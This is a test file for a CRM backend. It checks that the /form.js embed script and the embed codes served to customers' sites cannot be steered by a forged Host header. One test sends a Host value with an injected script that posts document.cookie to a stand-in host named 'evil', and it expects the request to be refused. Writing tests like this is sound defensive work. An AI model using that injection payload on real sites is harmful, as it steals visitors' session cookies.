import { describe, it, expect, beforeAll, beforeEach, afterEach, vi } from "vitest";
import vm from "vm";
import jwt from "jsonwebtoken";
import { sessionVersion } from "../src/utils/generateToken.js";

// /form.js is cached and loaded by every site that embeds a CRM form, and the embed codes are
// pasted onto customers' pages: neither may be steered by a forged Host header.

const mockQuery = vi.fn();
vi.mock("../config/db.js", () => ({ query: (...a) => mockQuery(...a), getClient: vi.fn(), default: {} }));

const SECRET = "test-secret-do-not-use-in-prod";
let app;
let request;

beforeAll(async () => {
  process.env.JWT_SECRET = SECRET;
  process.env.NODE_ENV = "test";
  app = (await import("../src/app.js")).default;
  request = (await import("supertest")).default;
});

let saved;
beforeEach(() => {
  saved = { api: process.env.PUBLIC_API_BASE, app: process.env.PUBLIC_APP_URL, origins: process.env.ALLOWED_ORIGINS };
  delete process.env.PUBLIC_API_BASE;
  delete process.env.PUBLIC_APP_URL;
  process.env.ALLOWED_ORIGINS = "http://localhost:3001";
  mockQuery.mockReset();
});
afterEach(() => {
  for (const [k, v] of [["PUBLIC_API_BASE", saved.api], ["PUBLIC_APP_URL", saved.app], ["ALLOWED_ORIGINS", saved.origins]]) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
});

/** Run the served script and read back the API base it would call. */
const apiBaseIn = (script) => {
  const window = {};
  vm.runInNewContext(script, { window, document: {} });
  return window.CRMForm._apiBase;
};

describe("GET /form.js", () => {
  it("uses PUBLIC_API_BASE and lets caches keep it", async () => {
    process.env.PUBLIC_API_BASE = "https://api-crm.example.com/";
    const res = await request(app).get("/form.js").set("Host", "evil.example");
    expect(apiBaseIn(res.text)).toBe("https://api-crm.example.com");
    expect(res.headers["cache-control"]).toBe("public, max-age=86400");
  });

  it("falls back to the request host but is never cached publicly then", async () => {
    const res = await request(app).get("/form.js").set("Host", "api.example.com");
    expect(apiBaseIn(res.text)).toBe("http://api.example.com");
    expect(res.headers["cache-control"]).toBe("private, no-store");
  });

  it("refuses a Host header that is not a plain host", async () => {
    const res = await request(app)
      .get("/form.js")
      .set("Host", "x';fetch('//evil/'+document.cookie);//");
    expect(res.status).toBe(400);
    expect(res.text).not.toContain("fetch('//evil/");
  });
});

describe("GET /api/forms/:id/embed", () => {
  const admin = { id: 2, name: "A", email: "a@example.com", role: "admin", is_active: true, account_status: "active", password: "hash" };
  const token = () => jwt.sign({ id: 2, sv: sessionVersion("hash") }, SECRET, { algorithm: "HS256", expiresIn: "5m" });

  it("points the iframe and form link at the web app, and the script at the API", async () => {
    process.env.PUBLIC_API_BASE = "https://api-crm.example.com";
    process.env.ALLOWED_ORIGINS = "https://crm.example.com,https://other.example.com";
    mockQuery.mockImplementation(async (sql) =>
      /FROM users/i.test(sql)
        ? { rows: [admin], rowCount: 1 }
        : { rows: [{ id: 5, name: "Lead form", status: "published", form_json: { fields: [] } }], rowCount: 1 }
    );
    const res = await request(app).get("/api/forms/5/embed").set("Authorization", `Bearer ${token()}`);
    expect(res.status).toBe(200);
    expect(res.body.data.formUrl).toBe("https://crm.example.com/embed/5");
    expect(res.body.data.iframe).toContain('src="https://crm.example.com/embed/5"');
    expect(res.body.data.javascript).toContain('src="https://api-crm.example.com/form.js"');
  });
});
